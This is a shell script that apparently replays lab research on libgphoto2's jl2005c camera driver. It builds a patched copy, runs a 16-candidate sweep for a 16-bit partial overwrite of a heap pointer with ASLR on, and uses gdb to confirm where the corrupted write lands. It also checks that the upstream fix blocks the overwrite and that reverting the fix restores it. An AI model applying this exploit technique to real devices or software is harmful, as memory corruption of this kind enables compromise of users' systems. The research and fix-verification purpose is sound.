#!/bin/sh
# W193: clean-archive replay of the 16-bit partial spilled-priv overwrite.
# Reuses W192's full clang 18 build, then applies the mode-r patch and runs
# a fixed 16-candidate ASLR-on sweep. No candidate is derived from a live
# address in the sweep; gdb derives one separately only for byte proof.
set -eu

HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
T=$(CDPATH= cd -- "$HERE/.." && pwd)
ROOT=$(CDPATH= cd -- "$HERE/../../../.." && pwd)
TARBALL=${TARBALL:-$T/src/libgphoto2-2.5.34.tar.bz2}
BASE=${BASE_WORK:-/tmp/w193-lgp-base}
OUT=${OUT:-/tmp/w193-partial-priv.out}
PROBE=$BASE/probe-partial-priv
S=$BASE/src/libgphoto2-2.5.34
B=$BASE/build
P=$B/installdir
FIXED_SHA=4fdaf4b1bd7a3691fc0a0305566f46a6f5f4f68779784e7358a14c75a8a763a6
VULN_SHA=0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185

[ -f "$TARBALL" ] || { echo "missing TARBALL=$TARBALL" >&2; exit 2; }
command -v clang >/dev/null || { echo "clang is required" >&2; exit 2; }
command -v gdb >/dev/null || { echo "gdb is required" >&2; exit 2; }
mkdir -p "$(dirname "$OUT")"
exec >"$OUT" 2>&1

echo "== W192 base build and controls =="
WORK=$BASE TARBALL=$TARBALL sh "$T/live/replay-clang-control-flow.sh"

echo "== add W193 mode r and rebuild only vusb =="
cd "$S"
patch --dry-run -p1 < "$T/evidence/replay-vusb-partial-priv.patch"
patch -p1 < "$T/evidence/replay-vusb-partial-priv.patch"
make -C "$B/libgphoto2_port" -j4
make -C "$B/libgphoto2_port" install
clang -O0 -g -fno-omit-frame-pointer -I"$P/include" -I"$T/pins" \
	$(pkg-config --cflags glib-2.0) \
	"$T/evidence/replay-partial-priv-probe.c" -o "$PROBE" \
	-L"$P/lib" -lgphoto2 -lgphoto2_port $(pkg-config --libs glib-2.0)

run() {
	label=$1; shift
	printf '\n=== %s ===\n' "$label"
	set +e
	env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
		IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
		LD_LIBRARY_PATH="$P/lib" "$@"
	rc=$?
	set -e
	echo "RC=$rc"
}

echo "== safe count-100 control (no bulk partial write) =="
run SAFE env -u M2SHELL_JL2005_PRIV16 M2SHELL_JL2005_VUSB=r \
	M2SHELL_JL2005_COUNT=100 "$PROBE" usb:001,001

echo "== fixed 16-candidate fork sweep, one inherited ASLR/heap layout =="
ulimit -c 0
run SWEEP env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_FORK_SWEEP=1 "$PROBE" usb:001,001

echo "== gdb byte proof with ASLR off; candidate derived only here =="
GDB_PRIV_OUT=$BASE/w193-gdb-priv.out
set +e
env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
	IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
	LD_LIBRARY_PATH="$P/lib" M2SHELL_JL2005_VUSB=r \
	M2SHELL_JL2005_COUNT=100 gdb -q -batch \
	-ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
	-ex 'break jl2005c_init' -ex run \
	-ex 'printf "GDB_PRIV=%p\n", $rdx' -ex quit \
	--args "$PROBE" usb:001,001 > "$GDB_PRIV_OUT" 2>&1
set -e
priv=$(sed -n 's/^GDB_PRIV=\(0x[0-9a-fA-F]*\)$/\1/p' "$GDB_PRIV_OUT" | sed -n 1p)
[ -n "$priv" ] || { echo "gdb did not report priv" >&2; exit 2; }
low16=$(python3 -c 'import sys; print("%04x" % (int(sys.argv[1],16) & 0xffff))' "$priv")
partial=$(python3 -c 'import sys; print("0x%04x" % ((int(sys.argv[1],16)-0x1d0) & 0xffff))' "$priv")
echo "GDB original=$priv low16=$low16 derived_partial=$partial"

gdb_attack() {
	label=$1
	printf '\n=== %s ===\n' "$label"
	set +e
	env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
		IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
		LD_LIBRARY_PATH="$P/lib" M2SHELL_JL2005_VUSB=r \
		M2SHELL_JL2005_COUNT=1022 M2SHELL_JL2005_PRIV16="$partial" \
		gdb -q -batch -ex 'set disable-randomization on' \
		-ex 'set breakpoint pending on' -ex 'break jl2005c_init' \
		-ex run -ex 'set $orig=$rdx' -ex 'break jl2005c.c:154' \
		-ex continue \
		-ex 'printf "GDB_ATTACK ORIG=%p SLOT=%p DEST=%p RBP=%p RIP=%p\n", $orig, *(void**)($rbp-0x20), *(void**)($rbp-0x20)+0x40, $rbp, *(void**)($rbp+8)' \
		-ex 'x/4gx (char*)$orig-0x18' -ex continue \
		--args "$PROBE" usb:001,001
	rc=$?
	set -e
	echo "RC=$rc"
}
gdb_attack GDB_ATTACK

echo "== upstream-fix control and reversal =="
cd "$S"
patch -p1 < "$ROOT/lab/frontier/libgphoto2shell/pins/fix-6a3393d.patch"
got=$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)
[ "$got" = "$FIXED_SHA" ] || { echo "fixed sha mismatch $got" >&2; exit 2; }
make -C "$B/camlibs" jl2005c.la
make -C "$B/camlibs" install
gdb_attack GDB_FIXED
patch -R -p1 < "$ROOT/lab/frontier/libgphoto2shell/pins/fix-6a3393d.patch"
got=$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)
[ "$got" = "$VULN_SHA" ] || { echo "restored sha mismatch $got" >&2; exit 2; }
make -C "$B/camlibs" jl2005c.la
make -C "$B/camlibs" install
gdb_attack GDB_RESTORED

python3 - "$OUT" "$priv" "$partial" <<'PY'
import re, sys
text = open(sys.argv[1]).read()
parts = re.split(r'^=== (.+?) ===$', text, flags=re.M)
cases = {parts[i]: parts[i+1] for i in range(1, len(parts)-1, 2)}
checks = []
def check(name, ok):
    checks.append((name, bool(ok)))
def rc(k):
    m = re.search(r'^RC=(\d+)$', cases.get(k, ''), re.M)
    return int(m.group(1)) if m else None
check('W192 base 12 PASS / 0 FAIL', 'RESULT: 12 PASS / 0 FAIL' in text)
check('SAFE no partial bulk write', 'VUSB_PARTIAL=' not in cases.get('SAFE', ''))
check('SAFE direct no marker', 'DIRECT_RESULT=0' in cases.get('SAFE', ''))
check('SAFE rc=0', rc('SAFE') == 0)
sweep = cases.get('SWEEP', '')
check('16 fixed candidates ran', sweep.count('VUSB_PARTIAL=') == 16)
check('exactly one ASLR-on direct hit', sweep.count('SWEEP_HIT=') == 1 and 'DIRECT_RESULT=1' in sweep)
check('direct hit table marker', 'TABLE_DIRECT=57313933' in sweep)
check('sweep parent rc=0', rc('SWEEP') == 0)
m = re.search(r'GDB_ATTACK ORIG=(0x[0-9a-f]+) SLOT=(0x[0-9a-f]+) DEST=(0x[0-9a-f]+) RBP=(0x[0-9a-f]+) RIP=(0x[0-9a-f]+)', text)
check('gdb frame values present', bool(m))
if m:
    orig, slot, dest, rbp, rip = [int(x, 16) for x in m.groups()]
    check('partial slot = original-0x1d0', slot == orig - 0x1d0)
    check('memmove destination = original-0x190', dest == orig - 0x190)
    check('saved RIP not overwritten', rip != 0x5a5a5a5a5a5a5a5a)
check('gdb attack direct marker', 'DIRECT_RESULT=1' in cases.get('GDB_ATTACK', '') and 'TABLE_DIRECT=57313933' in cases.get('GDB_ATTACK', ''))
check('fixed no partial bulk write', 'VUSB_PARTIAL=' not in cases.get('GDB_FIXED', ''))
check('fixed no direct marker', 'DIRECT_RESULT=1' not in cases.get('GDB_FIXED', ''))
check('restored direct marker', 'DIRECT_RESULT=1' in cases.get('GDB_RESTORED', '') and 'TABLE_DIRECT=57313933' in cases.get('GDB_RESTORED', ''))
for name, ok in checks:
    print(('PASS ' if ok else 'FAIL ') + name)
print('RESULT: %d PASS / %d FAIL' % (sum(o for _, o in checks), sum(not o for _, o in checks)))
sys.exit(0 if all(o for _, o in checks) else 1)
PY
# End W193 replay.
